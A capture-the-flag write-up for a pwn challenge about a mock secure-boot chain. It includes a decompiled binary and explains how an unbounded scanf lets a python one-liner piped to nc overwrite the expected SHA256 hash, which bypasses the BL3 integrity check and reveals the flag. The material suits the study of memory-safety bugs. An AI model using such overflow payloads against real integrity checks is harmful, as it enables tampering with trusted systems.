# Somewhat SecureBoot
Category: Pwn, 150 Points

## Description

> My boss told me to implement a chain of trust mechanism for a remote server boot process. He said: "There are 3 bootloaders - BL1, BL2, BL3. make sure that no one will be able to compromise our images. use a strong integrity solution, You can use SHA256 or something."
> 
> So that's exactly what I did. The funny thing is - BL3 was already compromised, I have no idea what BL3 is suppose to do. But I do know that it's something important.
> 
> BTW, I don't think my boss knows much about integrity (don't tell him I said it).
> 
> nc challenges.ctfd.io 30071

An executable was attached.

## Solution

Let's connect to the service:

```console
root@kali:/media/sf_CTFs/matrix/Somewhat_SecureBoot# nc challenges.ctfd.io 30071
Bootloader number 1 - Up and running...
Checking environment...
Env is valid.

Setting up memory...
Configuring hardware...
Bootloader 1 completed. Calling next bootloader to load the kernel...

Attempting to load the bootloader /bootloaders/BL2.bin with hash e95e57eff2ae77a55f0559450ffafb508a33a21fff0c8a702f8858e682a02281
Bootloader integrity verified successfully.
Bootloader number 2... Up and running...

Configuring kernel...
Setting up process table...
Reserving ports 0-1023...
Initializing scheduler...
Crontab daemon started...
Bootloader 2 finished. Calling next bootloader to open up a shell...

Please enter the desired shell to execute upon startup (press 'a' for /bin/sh)

a
Executing shell: /bin/sh

Attempting to load the bootloader /bootloaders/BL3.bin with hash 20375b4eec91d51308d624660f7e0b4e8cd9fa4f82b5d50b6d38b6d1452c3070
Bootloader integrity compromised... Expected receiving hash: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Exiting...
```

We are asked to provide input. Entering 'a' should connect us to a `/bin/sh`, assuming we have a bootloader with the expected hash of `aaaaa...aa`. It looks like we have a different one though.

Let's take a look at the decompiled sources with Ghidra:
```c
undefined8 main(void)
{
  long lVar1;
  int iVar2;
  char **ppcVar3;
  long in_FS_OFFSET;
  char bootloader3_str [21];
  char user_input [32];
  char aaa_str [65];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  bootloader3_str._0_8_ = 7020949591435469359;
  bootloader3_str._8_8_ = 3696402165732107620;
  bootloader3_str._16_4_ = 1852400174;
  bootloader3_str[20] = '\0';
  aaa_str._0_8_ = 0x6161616161616161;
  aaa_str._8_8_ = 0x6161616161616161;
  aaa_str._16_8_ = 0x6161616161616161;
  aaa_str._24_8_ = 0x6161616161616161;
  aaa_str._32_8_ = 0x6161616161616161;
  aaa_str._40_8_ = 0x6161616161616161;
  aaa_str._48_8_ = 0x6161616161616161;
  aaa_str._56_8_ = 0x6161616161616161;
  aaa_str[64] = '\0';
  puts("Bootloader number 2... Up and running...\n");
  fflush(stdout);
  puts("Configuring kernel...");
  fflush(stdout);
  usleep(500000);
  puts("Setting up process table...");
  fflush(stdout);
  usleep(600000);
  puts("Reserving ports 0-1023...");
  fflush(stdout);
  usleep(600000);
  puts("Initializing scheduler...");
  fflush(stdout);
  usleep(700000);
  puts("Crontab daemon started...");
  fflush(stdout);
  usleep(700000);
  puts("Bootloader 2 finished. Calling next bootloader to open up a shell...\n");
  fflush(stdout);
  puts("Please enter the desired shell to execute upon startup (press \'a\' for /bin/sh)\n");
  fflush(stdout);
  __isoc99_scanf("%s",user_input);
  iVar2 = strcmp(user_input,"a");
  if (iVar2 == 0) {
    user_input._0_8_ = 29400045130965551;
  }
  printf("Executing shell: %s\n\n",user_input);
  fflush(stdout);
  ppcVar3 = read_firmaware(bootloader3_str);
  printf("Attempting to load the bootloader %s with hash %s\n",*ppcVar3,ppcVar3[1]);
  fflush(stdout);
  iVar2 = strcmp(ppcVar3[1],aaa_str);
  if (iVar2 == 0) {
    puts("Bootloader integrity verified successfully.");
    fflush(stdout);
    load(ppcVar3);
  }
  else {
    printf("Bootloader integrity compromised... Expected receiving hash: %s\nExiting...\n",aaa_str);
    fflush(stdout);
    destroy_bootloader(ppcVar3);
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We see that the program uses `scanf` to read user input into a buffer of 32 bytes. `scanf` is unsafe and we can use it to perform a buffer overflow.

```console
root@kali:/media/sf_CTFs/matrix/Somewhat_SecureBoot# python3 -c "print ('b'*35)" | nc challenges.ctfd.io 30071 | grep hash
Attempting to load the bootloader /bootloaders/BL2.bin with hash e95e57eff2ae77a55f0559450ffafb508a33a21fff0c8a702f8858e682a02281
Attempting to load the bootloader /bootloaders/BL3.bin with hash 20375b4eec91d51308d624660f7e0b4e8cd9fa4f82b5d50b6d38b6d1452c3070
Bootloader integrity compromised... Expected receiving hash: bbb
```

Looks like we can override the expected hash. Let's override it with the actual value:
```console
root@kali:/media/sf_CTFs/matrix/Somewhat_SecureBoot# python3 -c "print ('b'*32 + '20375b4eec91d51308d624660f7e0b4e8cd9fa4f82b5d50b6d38b6d1452c3070')" | nc challenges.ctfd.io 30071
Bootloader number 1 - Up and running...
Checking environment...
Env is valid.

Setting up memory...
Configuring hardware...
Bootloader 1 completed. Calling next bootloader to load the kernel...

Attempting to load the bootloader /bootloaders/BL2.bin with hash e95e57eff2ae77a55f0559450ffafb508a33a21fff0c8a702f8858e682a02281
Bootloader integrity verified successfully.
Bootloader number 2... Up and running...

Configuring kernel...
Setting up process table...
Reserving ports 0-1023...
Initializing scheduler...
Crontab daemon started...
Bootloader 2 finished. Calling next bootloader to open up a shell...

Please enter the desired shell to execute upon startup (press 'a' for /bin/sh)

Executing shell: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb20375b4eec91d51308d624660f7e0b4e8cd9fa4f82b5d50b6d38b6d1452c3070

Attempting to load the bootloader /bootloaders/BL3.bin with hash 20375b4eec91d51308d624660f7e0b4e8cd9fa4f82b5d50b6d38b6d1452c3070
Bootloader integrity verified successfully.
Bootloader number 3... Up and running...
Bootloader number 3 - Finished.

System is fully loaded and ready to use. The time is: 2020-02-20,20:40:23.
Welcome.
Congrats! FLAG__b00t_c0mpleted
```

